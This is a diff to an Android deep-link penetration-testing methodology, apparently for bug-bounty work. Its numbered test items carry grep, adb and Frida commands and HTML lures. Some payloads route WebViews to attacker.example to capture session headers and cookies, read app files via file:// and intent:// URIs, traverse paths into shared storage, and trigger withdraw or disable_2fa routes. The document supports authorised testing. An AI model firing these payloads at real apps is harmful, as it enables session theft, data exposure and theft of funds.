   adb shell am start -a android.intent.action.VIEW -d "targetapp://webview?url=file:///data/data/com.target.app/shared_prefs/auth.xml" com.target.app
   ```
 - **Proof:** The `alert(document.domain)` rendering the app's own web origin (screenshot), or the
@@ -1865,19 +1937,24 @@ Decision:
 - **How:**
   ```bash
   aapt dump badging base.apk | grep sdkVersion          # exploitable only if minSdkVersion <= 24
-  grep -n minSdkVersion out/apktool.yml
-  adb shell am start -a android.intent.action.VIEW \
-    -d 'targetapp://webview?url=https%3A%2F%2Fattacker.example%5C%40trusted.example%2F' com.target.app
+  grep -n minSdkVersion "$DEC/apktool/apktool.yml"
+  adb -s "$SERIAL" shell -n am start -a android.intent.action.VIEW \
+    -d "'targetapp://webview?url=https%3A%2F%2Fattacker.example%5C%40trusted.example%2F'" "$PKG"
   ```
   Confirm the divergence explicitly rather than inferring it:
   ```javascript
   Java.perform(function () {
-    var Uri = Java.use('android.net.Uri');
-    Uri.getHost.implementation = function () { var h = this.getHost(); console.log('[validator sees] ' + h + '  from ' + this.toString()); return h; };
+    // getHost/getScheme/getPath/getAuthority are ABSTRACT on android.net.Uri — a hook there never fires.
+    // Uri.parse() returns Uri$StringUri; Uri.Builder returns HierarchicalUri/OpaqueUri: hook the concrete classes.
+    ['android.net.Uri$StringUri', 'android.net.Uri$HierarchicalUri', 'android.net.Uri$OpaqueUri'].forEach(function (n) {
+      var C = Java.use(n);
+      C.getHost.implementation = function () { var h = this.getHost(); console.log('[validator sees] host=' + h + '  from ' + this.toString()); return h; };
+    });
     var WV = Java.use('android.webkit.WebView');
     WV.loadUrl.overload('java.lang.String').implementation = function (u) { console.log('[loader loads]  ' + u); return this.loadUrl(u); };
   });
   ```
+  (`getQueryParameter` is concrete on `Uri` and may be hooked there, as D09-012 does.)
 - **Proof:** The paired hook output — validator reading `trusted.example`, loader loading `attacker.example` —
   plus a request arriving at your server from the device. Quote the `minSdkVersion` in the same paragraph.
 - **Escalation:** → D09-060 (the headers follow the URL); → D10.
@@ -1902,8 +1979,8 @@ Decision:
   the app trusting the *object* instead of re-parsing its string form.
 - **How:**
   ```bash
-  grep -rn 'getIntent()\.getData()' out/sources/ -A8 | grep -nE 'getHost\(\)|getScheme\(\)|getUserInfo\(\)|getAuthority\(\)'
-  grep -rn 'Uri\.parse(.*getData()\.toString())' out/sources/     # presence = mitigated, quote it
+  grep -rn 'getIntent()\.getData()' "$DEC/jadx/sources/" -A8 | grep -nE 'getHost\(\)|getScheme\(\)|getUserInfo\(\)|getAuthority\(\)'
+  grep -rn 'Uri\.parse(.*getData()\.toString())' "$DEC/jadx/sources/"     # presence = mitigated, quote it
   ```
   From the attacker app, construct the divergent `Uri` and deliver it explicitly:
   ```java
@@ -1981,8 +2058,11 @@ Decision:
   ```javascript
   // Java side
   Java.perform(function () {
-    var Uri = Java.use('android.net.Uri');
-    Uri.getHost.implementation = function () { var h=this.getHost(); console.log('[JAVA] host='+h+' uri='+this.toString()); return h; };
+    // getHost is abstract on android.net.Uri: hook the concrete subclasses (D09-044)
+    ['android.net.Uri$StringUri', 'android.net.Uri$HierarchicalUri', 'android.net.Uri$OpaqueUri'].forEach(function (n) {
+      var C = Java.use(n);
+      C.getHost.implementation = function () { var h=this.getHost(); console.log('[JAVA] host='+h+' uri='+this.toString()); return h; };
+    });
   });
   ```
   ```bash
@@ -2016,7 +2096,7 @@ Decision:
   (`\\.` for a literal dot), which is another routine mistake.
 - **How:**
   ```bash
-  grep -oE 'android:path(Pattern|AdvancedPattern|Suffix|Prefix|)="[^"]*"' out/AndroidManifest.merged.xml | sort -u
+  grep -oE 'android:path(Pattern|AdvancedPattern|Suffix|Prefix|)="[^"]*"' "$DEC/apktool/AndroidManifest.xml" | sort -u
   ```
   For each declared pattern, fuzz the boundary in both directions — paths you expect in, and paths you expect
   out:
@@ -2024,7 +2104,7 @@ Decision:
   for p in "/pay/123" "/pay/" "/paysomething" "/pay/123/extra" "/PAY/123" "/pay/../admin" \
            "/pay/123/../../admin" "/pay/123%2F..%2Fadmin" "/pay//123" "/pay/./123"; do
     printf '%-32s ' "$p"
-    adb shell am start -W -a android.intent.action.VIEW -d "https://target.example$p" com.target.app 2>&1 \
+    adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'https://target.example$p'" "$PKG" 2>&1 \
       | grep -E 'Status|Activity|Error' | tr '\n' ' '; echo
   done
   ```
@@ -2053,7 +2133,7 @@ Decision:
   something else entirely inside the app's trusted context.
 - **How:**
   ```bash
-  grep -oE 'android:pathPrefix="[^"]*"' out/AndroidManifest.merged.xml | sort -u
+  grep -oE 'android:pathPrefix="[^"]*"' "$DEC/apktool/AndroidManifest.xml" | sort -u
   adb shell am start -W -a android.intent.action.VIEW -d "https://target.example/admin/collections/../../" com.target.app
   adb shell am start -W -a android.intent.action.VIEW -d "https://target.example/admin/collections/../../oauth/authorize?client_id=X" com.target.app
   adb shell am start -W -a android.intent.action.VIEW -d "https://target.example/admin/collections/..%2f..%2fsettings" com.target.app
@@ -2084,7 +2164,7 @@ Decision:
   filter, the validator and the resolver each treat differently.
 - **How:**
   ```bash
-  grep -oE 'android:host="[^"]*"' out/AndroidManifest.merged.xml | cut -d'"' -f2 | sort -u
+  grep -oE 'android:host="[^"]*"' "$DEC/apktool/AndroidManifest.xml" | cut -d'"' -f2 | sort -u
   for h in "target.example" "TARGET.example" "evil-target.example" "target.example.attacker.example" \
            ".target.example" "a.target.example" "target.example." "targ%65t.example" \
            "target。example" "xn--targt-zra.example"; do
@@ -2119,13 +2199,13 @@ Decision:
   developer read it as an intersection when it is not.
 - **How:**
   ```bash
-  grep -n -A12 'uri-relative-filter-group' out/AndroidManifest.merged.xml
+  grep -n -A12 'uri-relative-filter-group' "$DEC/apktool/AndroidManifest.xml"
   for p in "/admin" "/%61dmin" "//admin" "/./admin" "/x/../admin" "/admin/" "/ADMIN"; do
     printf '%-20s ' "$p"
-    adb shell am start -W -a android.intent.action.VIEW -d "https://target.example$p?debug=1" com.target.app 2>&1 | grep -E 'Status|Error' | tr '\n' ' '; echo
+    adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'https://target.example$p?debug=1'" "$PKG" 2>&1 | grep -E 'Status|Error' | tr '\n' ' '; echo
   done
   # and the query/fragment matchers
-  adb shell am start -W -a android.intent.action.VIEW -d "https://target.example/x?blocked=1&blocked=0" com.target.app
+  adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'https://target.example/x?blocked=1&blocked=0'" "$PKG"
   adb shell am start -W -a android.intent.action.VIEW -d "https://target.example/x#blocked=1" com.target.app
   ```
 - **Proof:** A path, query parameter or fragment the group intended to exclude still resolving to the app —
@@ -2151,7 +2231,7 @@ Decision:
   developer assumed it was unreachable.
 - **How:**
   ```bash
-  grep -n 'intentMatchingFlags' out/AndroidManifest.merged.xml
+  grep -n 'intentMatchingFlags' "$DEC/apktool/AndroidManifest.xml"
   adb shell am start -n com.target.app/.DeepLinkActivity -d "https://target.example/pay?amt=1"     # note: no -a
   adb logcat -s PackageManager | grep -E "Intent does not match component's intent filter:|Access blocked:"
   ```
@@ -2186,9 +2266,9 @@ Decision:
   restricting what reaches the framework router.
 - **How:**
   ```bash
-  grep -n 'intentMatchingFlags' out/AndroidManifest.merged.xml
+  grep -n 'intentMatchingFlags' "$DEC/apktool/AndroidManifest.xml"
   adb shell am start -a android.intent.action.VIEW -d 'https://attacker.example/anything' -n com.target.app/.MainActivity
-  adb shell am start -a android.intent.action.VIEW -d 'javascript:alert(1)'                 -n com.target.app/.MainActivity
+  adb -s "$SERIAL" shell -n am start -a android.intent.action.VIEW -d "'javascript:alert(1)'"                 -n "$PKG/.MainActivity"
   adb logcat -s PackageManager | grep -E "Intent does not match component's intent filter:|Access blocked:"
   ```
   Re-run the same from the zero-permission probe app (`am start` as `shell` is not AM-03 — D09-076).
@@ -2219,7 +2299,7 @@ Decision:
   and it is usually the router — because the router is what broke when hardening was enabled.
 - **How:**
   ```bash
-  grep -nE 'intentMatchingFlags="(none|enforceIntentFilter|allowNullAction)"' -B4 out/AndroidManifest.merged.xml
+  grep -nE 'intentMatchingFlags="(none|enforceIntentFilter|allowNullAction)"' -B4 "$DEC/apktool/AndroidManifest.xml"
   # confirm the relaxation is real on the named component, and that siblings still block
   adb shell am start -a android.intent.action.VIEW -d 'https://attacker.example/x' -n com.target.app/<the "none" component>
   adb shell am start -a android.intent.action.VIEW -d 'https://attacker.example/x' -n com.target.app/<a sibling component>
@@ -2251,7 +2331,7 @@ Decision:
 - **How:**
   ```bash
   adb shell pm get-app-links com.target.app                    # confirm 'verified' first
-  grep -B6 -A10 'autoVerify="true"' out/AndroidManifest.merged.xml | grep -E 'android:(host|path|pathPrefix|pathPattern|pathSuffix)'
+  grep -B6 -A10 'autoVerify="true"' "$DEC/apktool/AndroidManifest.xml" | grep -E 'android:(host|path|pathPrefix|pathPattern|pathSuffix)'
   # what does the WEB side do at the paths the app claims?
   curl -s -o /dev/null -w '%{http_code} %{redirect_url}\n' "https://target.example/r?u=https://attacker.example/"
   adb shell am start -W -a android.intent.action.VIEW -d "https://target.example/r?u=https://attacker.example/" com.target.app
@@ -2276,17 +2356,18 @@ Decision:
 | **Requires** | deeplink |
 | **Maps to** | Oversecured "Android deep link vulnerabilities" §5 — Domain Takeover via Expired Whitelist Entry; verbatim: "Static analysis cannot know that a domain has expired" |
 
+| **Record** | logs/D09-056.txt (WHOIS/expiry table), logs/D09-056-hosts.txt |
 - **Test:** The allow-list is not bypassed; it is *correct*, and one of its entries is a domain the original
   owner let lapse. No scanner will ever find this, which is precisely why it is worth an hour.
 - **How:**
   ```bash
   # harvest every host the app treats as trusted, from code and resources
-  grep -rhoE '[a-z0-9][a-z0-9.-]{2,60}\.(com|net|org|io|co|app|dev|cloud|me|link|tv|ai|xyz)' out/sources/ out/res/values/*.xml \
-    | tr 'A-Z' 'a-z' | sort -u > /tmp/hosts.txt
-  wc -l /tmp/hosts.txt
-  python3 - <<'PY'
-  import subprocess
-  for h in [l.strip() for l in open('/tmp/hosts.txt') if l.strip()]:
+  grep -rhoE '[a-z0-9][a-z0-9.-]{2,60}\.(com|net|org|io|co|app|dev|cloud|me|link|tv|ai|xyz)' "$DEC/jadx/sources/" "$DEC/apktool/res/values/"*.xml \
+    | tr 'A-Z' 'a-z' | sort -u > "$E/logs/D09-056-hosts.txt"
+  wc -l "$E/logs/D09-056-hosts.txt"
+  python3 - "$E/logs/D09-056-hosts.txt" <<'PY' | tee "$E/logs/D09-056.txt"
+  import subprocess, sys
+  for h in [l.strip() for l in open(sys.argv[1]) if l.strip()]:
       apex = '.'.join(h.split('.')[-2:])
       try:
           w = subprocess.run(['whois', apex], capture_output=True, text=True, timeout=15).stdout.lower()
@@ -2324,10 +2405,10 @@ Decision:
   other shared-tenant wildcard is not validation. Anyone can obtain a hostname inside those zones in minutes.
 - **How:**
   ```bash
-  grep -rnE 'endsWith\("\.|contains\("|startsWith\("https://' out/sources/ \
+  grep -rnE 'endsWith\("\.|contains\("|startsWith\("https://' "$DEC/jadx/sources/" \
     | grep -iE 's3|amazonaws|blob\.core|herokuapp|github\.io|firebaseapp|web\.app|cloudfront|netlify|pages\.dev|azurewebsites|appspot'
   # also mine any hardcoded allow-list array
-  grep -rn -A20 'TRUSTED_DOMAINS\|ALLOWED_HOSTS\|WHITELIST\|allowedHosts' out/sources/ | head -40
+  grep -rn -A20 'TRUSTED_DOMAINS\|ALLOWED_HOSTS\|WHITELIST\|allowedHosts' "$DEC/jadx/sources/" | head -40
   adb shell am start -a android.intent.action.VIEW \
     -d "targetapp://open?url=https://your-bucket.s3.amazonaws.com/x.html" com.target.app
   ```
@@ -2355,9 +2436,9 @@ Decision:
   traversal in D09-064 — here the target is the API path or the route table.
 - **How:**
   ```bash
-  grep -rn 'getPathSegments()\|getLastPathSegment()' out/sources/ -A10 | grep -nE '\+ *"|format\(|append\(|url\(|baseUrl|Retrofit|@Path'
+  grep -rn 'getPathSegments()\|getLastPathSegment()' "$DEC/jadx/sources/" -A10 | grep -nE '\+ *"|format\(|append\(|url\(|baseUrl|Retrofit|@Path'
   # Retrofit's @Path is encoded by default; @Path(encoded = true) is the smell
-  grep -rn '@Path(' out/sources/ | grep -i 'encoded *= *true'
+  grep -rn '@Path(' "$DEC/jadx/sources/" | grep -i 'encoded *= *true'
   ```
   ```bash
   adb shell am start -a android.intent.action.VIEW -d "targetapp://app/users?username=..%2F..%2Fadmin%2Fusers" com.target.app
@@ -2385,16 +2466,20 @@ Decision:
 | **Maps to** | MASTG risk `unsafe-use-of-deeplinks`, verbatim: "**Never** pass deep-link-derived URLs directly to `WebView.loadUrl()` without thorough validation"; H1 **#401793** (Grab, High 7.1 — $7,500 per Intigriti), **#532225** (Zomato, High, $750), **#328486** (Zomato — evidence line "All tokens were sent to Google page"), **#424443** (PayPal, Medium 5.4), **#1087744** (Shopify, Low 3.1), **#1500614** (TikTok, High 8.3), **#2417516** (TikTok, High 8.1, **CVE-2024-45240**) |
 
 - **Test:** The single most-paid Android bug class in the corpus. A `scheme://host?url=` route loads your value
-  in a WebView that already holds the user's session, cookies and JavaScript bridges.
+  in a WebView that already holds the user's session, cookies and JavaScript bridges. The sibling is content
+  injection rather than navigation: the parameter is concatenated into the `data` argument of
+  `loadDataWithBaseURL(<trusted https base>, data, …)`, so your markup runs as the trusted origin and no URL
+  validator ever sees a host — the grep below catches it; file it as D10-073 with this route as the delivery.
 - **How:**
   ```bash
-  grep -rn 'loadUrl(\|loadDataWithBaseURL(\|loadData(' out/sources/ -B12 \
+  grep -rn 'loadUrl(\|loadDataWithBaseURL(\|loadData(' "$DEC/jadx/sources/" -B12 \
     | grep -nE 'getIntent|getData|getQueryParameter|getStringExtra|getDataString'
   ```
   ```bash
-  adb shell am start -W -a android.intent.action.VIEW -d "targetapp://webview/?url=https://attacker.example/probe&title=wow" com.target.app
-  adb shell am start -W -a android.intent.action.VIEW -d "targetapp://open?screenType=HELPCENTER&page=https://attacker.example/probe" com.target.app
-  adb shell am start -W -a android.intent.action.VIEW -d "targetapp://open?host_internal=web_view&web_view_url=https://attacker.example/probe" com.target.app
+  # the device-side value is single-quoted a second time: an unquoted `&` backgrounds the command on the device and the URI arrives truncated
+  adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'targetapp://webview/?url=https://attacker.example/probe&title=wow'" "$PKG"
+  adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'targetapp://open?screenType=HELPCENTER&page=https://attacker.example/probe'" "$PKG"
+  adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'targetapp://open?host_internal=web_view&web_view_url=https://attacker.example/probe'" "$PKG"
   ```
   Then from a page, which is what proves AM-02 and removes the installed-app precondition:
   ```html
@@ -2430,9 +2515,9 @@ Decision:
   `CookieManager.setCookie(url, ...)` writes the session cookie **for your origin**.
 - **How:**
   ```bash
-  grep -rn 'loadUrl(' out/sources/ -A2 | grep -nE 'Map|HashMap|header|Header|Authorization|getAuthHeaders|token'
-  grep -rn 'CookieManager' out/sources/ -B4 -A4 | grep -nE 'setCookie|setAcceptThirdPartyCookies|getCookie'
-  grep -rn 'addRequestHeader\|setRequestProperty\|newBuilder()\.addHeader' out/sources/ | head
+  grep -rn 'loadUrl(' "$DEC/jadx/sources/" -A2 | grep -nE 'Map|HashMap|header|Header|Authorization|getAuthHeaders|token'
+  grep -rn 'CookieManager' "$DEC/jadx/sources/" -B4 -A4 | grep -nE 'setCookie|setAcceptThirdPartyCookies|getCookie'
+  grep -rn 'addRequestHeader\|setRequestProperty\|newBuilder()\.addHeader' "$DEC/jadx/sources/" | head
   ```
   ```javascript
   Java.perform(function () {
@@ -2443,10 +2528,15 @@ Decision:
       while (it.hasNext()) { var k = it.next(); console.log('   ' + k + ': ' + h.get(k)); }
       return this.loadUrl(u, h);
     };
-    var CM = Java.use('android.webkit.CookieManager');
-    CM.setCookie.overload('java.lang.String','java.lang.String').implementation = function (u, c) {
-      console.log('[setCookie] ' + u + '  <- ' + c); return this.setCookie(u, c);
-    };
+    // android.webkit.CookieManager is abstract; the implementation lives in the WebView provider's class loader
+    var loader = null;
+    Java.enumerateClassLoaders({ onMatch: function (l) { try { l.findClass('com.android.webview.chromium.CookieManagerAdapter'); loader = l; } catch (e) {} }, onComplete: function () {} });
+    if (loader) {
+      var CM = Java.ClassFactory.get(loader).use('com.android.webview.chromium.CookieManagerAdapter');
+      CM.setCookie.overload('java.lang.String', 'java.lang.String').implementation = function (u, c) {
+        console.log('[setCookie] ' + u + '  <- ' + c); return this.setCookie(u, c);
+      };
+    } else { console.log('[-] WebView provider not loaded yet - open a WebView screen, then re-run'); }
   });
   ```
 - **Proof:** The full HTTP request as it arrived at your listener, headers included, plus the Frida line
@@ -2480,7 +2570,7 @@ Decision:
   Intent intent10 = new Intent(context, WebViewActivity.class);
   ```
   ```bash
-  grep -rnE 'getQueryParameter\("(proceed_to|redirect|redirect_uri|redirect_url|next|return_to|returnUrl|continue|target|dest|callback|url)"\)' out/sources/ -B10 -A10
+  grep -rnE 'getQueryParameter\("(proceed_to|redirect|redirect_uri|redirect_url|next|return_to|returnUrl|continue|target|dest|callback|url)"\)' "$DEC/jadx/sources/" -B10 -A10
   # the tell is a validator call ABOVE the extraction, with no re-validation below it
   ```
   ```bash
@@ -2528,7 +2618,7 @@ Decision:
   buildUpon.appendQueryParameter(SESSION_QUERY_PARAM, l.getInstance().getSessionId());
   ```
   ```bash
-  grep -rn 'appendQueryParameter(\|buildUpon()\|\.addHeader(\|setQueryParameter(' out/sources/ -B12 \
+  grep -rn 'appendQueryParameter(\|buildUpon()\|\.addHeader(\|setQueryParameter(' "$DEC/jadx/sources/" -B12 \
     | grep -nE 'getIntent|getStringExtra|getData|getQueryParameter'
   ```
   Triggered from a web page with a single click, because the activity was exported with a BROWSABLE filter:
@@ -2560,9 +2650,9 @@ Decision:
   Test both sinks with both scheme families.
 - **How:**
   ```bash
-  grep -rnE 'new File\(|FileInputStream\(|openFileInput\(|Files\.readAllBytes|getContentResolver\(\)\.openInputStream' out/sources/ -B10 \
+  grep -rnE 'new File\(|FileInputStream\(|openFileInput\(|Files\.readAllBytes|getContentResolver\(\)\.openInputStream' "$DEC/jadx/sources/" -B10 \
     | grep -nE 'getIntent|getData|getQueryParameter|getStringExtra'
-  grep -rn 'setAllowFileAccess\|setAllowFileAccessFromFileURLs\|setAllowUniversalAccessFromFileURLs\|setAllowContentAccess' out/sources/
+  grep -rn 'setAllowFileAccess\|setAllowFileAccessFromFileURLs\|setAllowUniversalAccessFromFileURLs\|setAllowContentAccess' "$DEC/jadx/sources/"
   aapt dump badging base.apk | grep targetSdkVersion
   ```
   ```bash
@@ -2590,7 +2680,7 @@ Decision:
 | **Severity ceiling** | Medium |
 | **VRT** | `insecure_data_storage.sensitive_application_data_stored_unencrypted.on_external_storage` (P4) for the landing location; the *read by another app* is the impact — file the consequence |
 | **Attacker** | AM-02 (an in-product link; no malicious app needed) |
-| **Applies to** | all; scoped storage (**API 29+**) narrows who can read `/sdcard`, but `/sdcard/Download/` remains broadly readable via the Downloads collection or `MANAGE_EXTERNAL_STORAGE` — say which applies on your test device |
+| **Applies to** | all; on Android 10 with legacy storage the write is world-readable. On Android 11+ a **non-media** file another app wrote to `Download/` is readable only by an app holding `MANAGE_EXTERNAL_STORAGE` (a user-granted special access) or through a user-driven picker — the Downloads collection exposes other apps' files only to the owner or to all-files-access holders. Say which applies on the test device and targetSdk; it is the attacker model you report |
 | **Requires** | deeplink, device |
 | **Maps to** | H1 **#2553411** (Basecamp, **Medium 5.5**, CWE Path Traversal) |
 
@@ -2598,17 +2688,22 @@ Decision:
   directory into shared storage so that any app with storage access gets the victim's private data.
 - **How:**
   ```bash
-  grep -rnE 'FileOutputStream\(|openFileOutput\(|new File\(.*getExternalFilesDir|Environment\.getExternalStorage' out/sources/ -B10 \
+  grep -rnE 'FileOutputStream\(|openFileOutput\(|new File\(.*getExternalFilesDir|Environment\.getExternalStorage' "$DEC/jadx/sources/" -B10 \
     | grep -nE 'getIntent|getQueryParameter|getStringExtra|filename|fileName'
   ```
   ```html
   <a href="https://target.example/reports/progress?filename=/../../../../../../../../../../sdcard/Download/disclosure.txt">click me</a>
+  <!-- media-typed variant: the file is indexed into the Images collection and readable with READ_MEDIA_IMAGES / READ_EXTERNAL_STORAGE,
+       so the reading side needs only a normal permission instead of MANAGE_EXTERNAL_STORAGE -->
+  <a href="https://target.example/reports/progress?filename=/../../../../../../../../../../sdcard/Pictures/disclosure.jpg">click me</a>
   ```
   ```bash
-  adb shell ls -la /sdcard/Download/disclosure.txt && adb shell cat /sdcard/Download/disclosure.txt
+  adb -s "$SERIAL" shell -n ls -la /sdcard/Download/disclosure.txt /sdcard/Pictures/disclosure.jpg
+  # the read that counts is the probe app's, with its permission set stated (D09-076); `adb shell cat` runs as shell and proves nothing
   ```
-- **Proof:** The victim's private report readable at `/sdcard/Download/` by a zero-privilege app — show the
-  file listing, the contents, and the reading app's manifest permission set.
+- **Proof:** The victim's private report read back by the probe app, with the probe's permission set stated
+  (none / `READ_MEDIA_*` / `MANAGE_EXTERNAL_STORAGE`) — that permission set is the attacker model you report.
+  Show the file listing, the contents, and the reading app's manifest permission block.
 - **Escalation:** → D11 storage; the delivery is in-product (comments, chat, notifications frequently allow
   links), which removes the "requires a malicious page" caveat.
 - **Ruled out when:** The filename is sanitised (basename only, or a server-supplied identifier) and the write
@@ -2621,22 +2716,24 @@ Decision:
 |---|---|
 | **Severity ceiling** | Critical |
 | **VRT** | `broken_access_control.exposed_sensitive_android_intent` (null) → P1 by what the launched component does |
-| **Attacker** | AM-02 (delivered from a web page — this is what makes it worse than the D08 local variant) |
+| **Attacker** | AM-02 (delivered from a web page through the app's own router — this is what makes it worse than the D08-022 local variant; the `shouldOverrideUrlLoading` variant is D10-065) |
 | **Applies to** | all |
 | **Requires** | deeplink |
-| **Maps to** | AOSP `content/Intent.java` — `parseUri`, `URI_INTENT_SCHEME`, `URI_ANDROID_APP_SCHEME`, `URI_ALLOW_UNSAFE`; MASTG risk `intent-redirection` (which names WebView-to-Intent conversion as a redirection source); the corpus's EngageLab push-SDK case (`processPlatformMessage()` → `n_intent_uri` → `parseUri()` with `URI_ALLOW_UNSAFE`, constant value 4) |
+| **Maps to** | AOSP `content/Intent.java` — `parseUri`, `URI_INTENT_SCHEME`, `URI_ANDROID_APP_SCHEME`, `URI_ALLOW_UNSAFE`; MASTG risk `intent-redirection` (which names WebView-to-Intent conversion as a redirection source); the corpus's EngageLab push-SDK case (`processPlatformMessage()` → `n_intent_uri` → `parseUri()` with `URI_ALLOW_UNSAFE`, constant value 4); D08-022 (the local-app delivery of the same sink — grep, clear-check and payloads live there) and D17-049 (the deserializer view); this item is the AM-02 delivery wrapper only |
 
 - **Test:** `Intent.parseUri()` reconstructs a full `Intent` — component, action, flags and extras — from a
   string. A deep-link handler that converts a user-supplied `intent://…#Intent;…;end` string into an Intent
   and starts it hands you the app's launch authority, from a link.
 - **How:**
   ```bash
-  grep -rn 'parseUri\|URI_INTENT_SCHEME\|URI_ALLOW_UNSAFE\|URI_ANDROID_APP_SCHEME\|getIntentOld' out/sources/ -B4 -A10 \
-    | grep -viE '^out/sources/(android|androidx)/'
-  # and the fix-bypass check: is the component/selector cleared before launch?
-  grep -rn 'setComponent(null)\|setSelector(null)\|setPackage(null)\|addCategory(.*BROWSABLE' out/sources/
+  # the grep and the fix-bypass (component AND selector cleared?) check are D08-022's — run them once, record there;
+  # the D09-specific step is the DELIVERY: the intent:// string arrives through the deep link (the app's own router
+  # parses it), not through a WebView client (that is D10-065) and not from a local app (D08-022)
+  grep -rn 'parseUri\|URI_INTENT_SCHEME\|URI_ALLOW_UNSAFE\|URI_ANDROID_APP_SCHEME\|getIntentOld' "$DEC/jadx/sources/" -B4 -A10 \
+    | grep -viE '/jadx/sources/(android|androidx)/'
+  grep -rn 'setComponent(null)\|setSelector(null)\|setPackage(null)\|addCategory(.*BROWSABLE' "$DEC/jadx/sources/"
   ```
-  Payloads, delivered through the deep link or from web content already inside the app's WebView:
+  Payloads, delivered through the deep link (the router-side `intent://`; the WebView-client-side variant is D10-065):
   ```
   intent://x/#Intent;scheme=https;package=com.target.app;component=com.target.app/com.target.app.internal.NonExportedActivity;end
   intent:#Intent;action=android.intent.action.VIEW;S.url=file:///data/data/com.target.app/databases/app.db;end
@@ -2673,7 +2770,7 @@ Decision:
            "targetapp://settings/disable_2fa" \
            "targetapp://account/link?provider=attacker&token=X" \
            "targetapp://wallet/withdraw?amount=all&addr=ATTACKER"; do
-    echo "== $u"; adb shell am start -W -a android.intent.action.VIEW -d "$u" com.target.app; sleep 3
+    echo "== $u"; adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'$u'" "$PKG"; sleep 3   # quoted twice: `&` would end the command on the device
   done
   ```
   Then the delivery that sets the attacker model:
@@ -2702,19 +2799,23 @@ Decision:
 | **Requires** | deeplink, device |
 | **Maps to** | MASTG risk `unsafe-use-of-deeplinks` — "Check internal state: verify preconditions before exposing sensitive functionality"; MASWE-0018 |
 
+| **Record** | logs/D09-067.txt (cold / user-A / user-B sweeps with matching input and output counts), screenshots/D09-067-<n>.png, requests/E-NNN.http |
 - **Test:** Deep links bypass the navigation graph. An activity that assumes "the user got here through login"
   is reachable cold. Fire every route three ways: logged out with cleared data, logged in as user A with
   user A's identifiers, and logged in as user A with user B's identifiers.
 - **How:**
   ```bash
-  adb shell pm clear com.target.app                      # no session at all
-  for u in $(cat routes.txt); do
-    printf '%-60s ' "$u"
-    adb shell am start -W -a android.intent.action.VIEW -d "$u" com.target.app 2>&1 | grep -Eo 'Status: [a-z]+' | tr '\n' ' '
-    adb shell dumpsys activity activities | grep -m1 topResumedActivity | sed 's/.*u0 //;s/ .*//'
-  done
+  adb -s "$SERIAL" shell -n pm clear "$PKG"                      # no session at all
+  # `read -r` keeps backslashes; `adb shell -n` leaves the loop's stdin alone (without it the loop ends after one row);
+  # the device-side value is single-quoted a second time; never `for u in $(cat routes.txt)` — a pathPattern `*` globs
+  while IFS= read -r u; do
+    s=$(adb -s "$SERIAL" shell -n am start -W -a android.intent.action.VIEW -d "'$u'" "$PKG" 2>&1 | grep -Eo 'Status: [a-z]+' | tr '\n' ' ')
+    top=$(adb -s "$SERIAL" shell -n dumpsys activity activities | grep -m1 -E 'ResumedActivity' | sed 's/.*u0 //;s/ .*//')
+    printf '%-60s %s %s\n' "$u" "$s" "$top"
+  done < routes.txt | tee "$E/logs/D09-067.txt"
+  echo "fired $(wc -l < "$E/logs/D09-067.txt") / $(wc -l < routes.txt)"    # the counts must match
   # source side: does the handler parse before it gates?
-  grep -rn 'onCreate\|onNewIntent' out/sources/<handlers> -A30 | grep -nE 'isLoggedIn|requireAuth|hasSession|getToken|checkAuth'
+  grep -rn 'onCreate\|onNewIntent' "$DEC/jadx/sources/<handlers>" -A30 | grep -nE 'isLoggedIn|requireAuth|hasSession|getToken|checkAuth'
   ```
   Keep the proxy attached throughout — the server's decision is what matters, not the screen.
 - **Proof:** The screen rendering (or the action committing) with cleared app data, plus the backend request in
@@ -2744,7 +2845,7 @@ Decision:
   # identify the identifier-bearing routes from the D09-041 table, then:
   adb shell am start -a android.intent.action.VIEW -d "targetapp://order/<userB_order_id>" com.target.app
   adb shell am start -a android.intent.action.VIEW -d "https://app.target.example/order/99999" com.target.app
-  adb shell am start -a android.intent.action.VIEW -d "targetapp://transfer?amount=-1&to=attacker" com.target.app
+  adb -s "$SERIAL" shell -n am start -a android.intent.action.VIEW -d "'targetapp://transfer?amount=-1&to=attacker'" "$PKG"
   ```
   Capture the resulting request in the proxy, then replay it directly with `curl` — the server, not the app,
   is the authorisation boundary, and the direct replay is what proves it.
@@ -2774,14 +2875,14 @@ Decision:
   while the deep-link path uses a looser one.
 - **How:**
   ```bash
-  grep -rnE '"\(all\)"|"max"|"unlimited"|MAX_VALUE|SEND_ALL|createTransactionAll|sweepAll|BigDecimal\.ZERO' out/sources/ | head -30
+  grep -rnE '"\(all\)"|"max"|"unlimited"|MAX_VALUE|SEND_ALL|createTransactionAll|sweepAll|BigDecimal\.ZERO' "$DEC/jadx/sources/" | head -30
   # find every entry path into the same model and compare their parsers
-  grep -rn 'tx_amount\|amount\|value' out/sources/ -l | head
+  grep -rn 'tx_amount\|amount\|value' "$DEC/jadx/sources/" -l | head
   ```
   ```bash
-  adb shell am start -a android.intent.action.VIEW -d "targetapp://<addr>?tx_amount=(all)&tx_description=test" com.target.app
-  adb shell am start -a android.intent.action.VIEW -d "targetapp://pay?amount=-1&to=attacker" com.target.app
-  adb shell am start -a android.intent.action.VIEW -d "targetapp://pay?amount=99999999999999999999&to=attacker" com.target.app
+  adb -s "$SERIAL" shell -n am start -a android.intent.action.VIEW -d "'targetapp://<addr>?tx_amount=(all)&tx_description=test'" "$PKG"
+  adb -s "$SERIAL" shell -n am start -a android.intent.action.VIEW -d "'targetapp://pay?amount=-1&to=attacker'" "$PKG"
+  adb -s "$SERIAL" shell -n am start -a android.intent.action.VIEW -d "'targetapp://pay?amount=99999999999999999999&to=attacker'" "$PKG"
   ```
 - **Proof:** The app entering the sentinel code path — `createTransactionAllAsync(...)` rather than the numeric
   path — with the attacker's destination pre-filled. Rate it honestly: Monero's report says so itself, "this is
@@ -2807,14 +2908,14 @@ Decision:
   that reaches the API client's base URL. The app then sends its real credentials to whatever host you named.
 - **How:**
   ```bash
-  grep -rnE 'baseUrl\(|setEndpoint\(|HttpUrl\.parse|Retrofit\.Builder|\.host\(|BASE_URL|API_HOST|Environment\.' out/sources/ -B10 \
